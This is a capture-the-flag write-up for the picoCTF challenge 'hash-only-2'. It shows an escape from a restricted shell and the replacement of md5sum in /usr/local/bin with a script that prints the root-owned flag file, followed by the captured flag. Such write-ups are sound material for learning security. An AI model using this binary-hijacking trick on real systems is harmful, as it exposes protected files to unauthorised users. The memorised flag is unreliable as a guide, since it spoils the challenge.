---
title: hash-only-2
category: Hello
difficulty: Hard
date: 2026-09-03
tags:
  - Web
  - SQLi
  - Linux
  - PrivEsc
summary: Uwuga
status: Ongoing
---

# hash-only-2

## 1. Challenge Description

> [!quote] Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content! Connect using `ssh ctf-player@rescued-float.picoctf.net -p 52156` with the password, `4f5344cd` and run the binary named "flaghasher".



### Solution
Connecting to ssh
```bash
$ ssh ctf-player@rescued-float.picoctf.net -p 52156
```
I couldnt find "flaghasher" inside the home folder so I tried searching for it
```bash
$ find / | grep "flaghasher"
```

I can't cd to the binaries folder to modify md5sum this time but I tried 
```
$ cd /usr/local/bin
-rbash: cd: restricted

$ bash
$ cd /usr/local/bin
$ echo -e '#!/bin/bash\ncat "$@"\n/bin/md5sum "$@"' > md5sum
$ chmod +x md5sum
$ flaghasher

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_f6f1b3d4}27a090d1f1a1a3106763e8e747a15973  /root/flag.txt
```
##  The Flag

> [!SUCCESS] Flag `picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_f6f1b3d4}`



